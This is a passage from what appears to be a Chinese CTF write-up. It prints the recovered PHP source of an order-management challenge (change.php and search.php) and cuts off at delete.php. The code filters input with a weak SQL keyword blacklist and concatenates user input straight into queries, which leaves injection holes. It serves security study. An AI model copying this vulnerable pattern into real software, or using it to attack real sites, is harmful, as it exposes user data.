class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">retina</span>-1.1.0.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">unveilEffects</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;!--?<span class="title">file</span>=?--&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230507212819532.png" alt="image-20230507212819532"></p><p>查看解析出来的代码，发现还可以继续进行读取</p><p>change.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$address</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单修改成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;修改收货地址&lt;/title&gt;</span><br><span class="line">&lt;base href=<span class="string">&quot;./&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/bootstrap.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/custom-animations.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;h&quot;</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-8 <span class="title">col</span>-<span class="title">md</span>-<span class="title">offset</span>-2 <span class="title">centered</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span> <span class="title">style</span>=&quot;<span class="title">margin</span>:35<span class="title">px</span> 0;&quot;&gt;&lt;<span class="title">br</span>&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">h1</span>&gt;修改收货地址&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;姓名:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">user_name</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;电话:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">phone</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;地址:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">address</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">button</span> <span class="title">class</span>=&#x27;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span>  <span class="title">btn</span>-<span class="title">sub</span> <span class="title">btn</span>-<span class="title">white</span>&#x27; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;修改订单&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">global</span> $<span class="title">msg</span>; <span class="title">echo</span> &#x27;&lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot;&gt;&#x27;.$<span class="title">msg</span>.&#x27;&lt;/<span class="title">h2</span>&gt;&#x27;;?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">f</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">p</span> <span class="title">style</span>=&quot;<span class="title">margin</span>:35<span class="title">px</span> 0;&quot;&gt;&lt;<span class="title">br</span>&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot;&gt;订单管理&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">index</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&#x27;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">sub</span> <span class="title">btn</span>-<span class="title">white</span>&#x27;&gt;返回&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">search</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我要查订单&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">delete</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我不想要了&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">retina</span>-1.1.0.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">unveilEffects</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><p>search.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123; </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$row</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;&lt;p&gt;姓名:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_name&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;搜索&lt;/title&gt;</span><br><span class="line">&lt;base href=<span class="string">&quot;./&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/bootstrap.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/custom-animations.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;h&quot;</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-8 <span class="title">col</span>-<span class="title">md</span>-<span class="title">offset</span>-2 <span class="title">centered</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span> <span class="title">style</span>=&quot;<span class="title">margin</span>:35<span class="title">px</span> 0;&quot;&gt;&lt;<span class="title">br</span>&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">h1</span>&gt;订单查询&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;姓名:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">user_name</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;电话:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">phone</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">button</span> <span class="title">class</span>=&#x27;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span>  <span class="title">btn</span>-<span class="title">sub</span> <span class="title">btn</span>-<span class="title">white</span>&#x27; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;查询订单&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">global</span> $<span class="title">msg</span>; <span class="title">echo</span> &#x27;&lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot;&gt;&#x27;.$<span class="title">msg</span>.&#x27;&lt;/<span class="title">h2</span>&gt;&#x27;;?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">f</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">p</span> <span class="title">style</span>=&quot;<span class="title">margin</span>:35<span class="title">px</span> 0;&quot;&gt;&lt;<span class="title">br</span>&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot;&gt;订单管理&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">index</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&#x27;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">sub</span> <span class="title">btn</span>-<span class="title">white</span>&#x27;&gt;返回&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">change</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我要修改收货地址&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt; </span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">delete</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我不想要了&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;    </span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">retina</span>-1.1.0.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">unveilEffects</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><p>delete.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 